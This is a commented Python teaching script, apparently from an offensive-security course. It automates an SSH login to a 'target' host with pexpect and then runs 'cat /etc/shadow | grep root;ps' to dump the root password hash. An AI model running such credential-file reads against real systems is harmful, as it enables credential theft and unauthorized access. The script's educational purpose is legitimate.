"""
WE wan to be able to ssh into a target, login, and gather data
We have a copy of this file, without notes - sshlogin2.py
"""
#!/usr/bin/python3
# -------------------
# Imports
import pexpect  # Had to install also
"""
pexpect can be used for automating interactive console applications such as
ssh, ftp, passwd, telnet, etc.
- IF Needed:    sudo apt-get install python-pexpect
                pip install pexpect
"""
# -------------------
PROMPT = ['#', '>>>', '>', '\$']  # After password, we would expect a return prompt (options) from the target machine meaning that we are logged in.
# ---------------------------------------------------------
# ---------------------------------------------------------


def send_command(child, command):       # child  AKA  the connection
    # Send the connection, and the command to use on that connection
    child.sendline(command)
    child.expect(PROMPT)
    print(f'{child.before}')  # print the output of the command on the target system

# ---------------------------------------------------------
# ---------------------------------------------------------


def connect(host, user, password):
    # Prepare for the ssh to ask if we still want to login/confirm key.
    """If you have already logged in, and established a connection to the target, you may not get the response below.
        Just remember that this needs to be tailored to the target.
        For example:    Currently if I try to ssh into:      ssh ncterry@10.0.2.7
                        The only response that I get =      'ncterry@10.0.2.7 password: '
    """
    ssh_newkey = "Are you sure you want to continue connecting"  # Potential question when trying to ssh into target
    connStr = "ssh " + user + "@" + host     # EX.    ssh ncterry@10.0.2.7
    """
    pexpect waits for the child application to return a given string.
    The powerful interface is the spawn class. 
    You can use this to spawn an external child command and then interact with the child by sending lines and expecting responses.
        For example:
                    child = pexpect.spawn('scp foo myname@host.example.com:.')   # Send a command
                    child.expect ('Password:')      # Response to that command
                    child.sendline (mypassword)     # User response to the response
        """
    child = pexpect.spawn(connStr)  # Send ssh command to target
    """
    We just send an ssh command to the target, and if accurate, we expect a return response.
        Our guess is the response will be:      'Are you sure you want to continue connecting'
                                                'Password:    or     password: '   
    ret will actually only be a    1 or 0
    1 = we get a connection, and a return value.
    """
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
    if ret == 0:  # IF return value is 0, then we cannot connect
        print(f'[-] Error Connecting')
        return
    if ret == 1:
        """  1  = that we have established a connection to target and that it is likely asking us
                to confirm that we are trying to login. This is where we may get the:
                    'Are you sure you want to continue connecting'      
            In which case, we would want to respond with    'yes'   """
        child.sendline('yes')
        # yes we wnat to continue, then we expect a password request next.
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if ret == 0:
            print(f'[-] Error Connecting')
            return
    child.sendline(password)  # Send password to finish the login.
    child.expect(PROMPT)
    return child
# ---------------------------------------------------------


def main():
    host = input("Enter the target IP: ")                        # "10.0.2.7"   # Target IP
    user = input("Enter the SSSH username on the target IP: ")   # ncterry    # Target user, on target IP
    password = input("Enter the SSH password: ")
    child = connect(host, user, password)   # Created function to ssh in, and return info
    #
    "The send_command function sends commands to our SSH target" \
    "Print the /etc/shadow and look for lines with root" \
    "The semicolon + ps is just another command to print running processes as well." \
    "       That is simply just to exhibit that we can run a second command. "
    send_command(child, 'cat /etc/shadow | grep root;ps')
# --------------------------------------------------------

main()


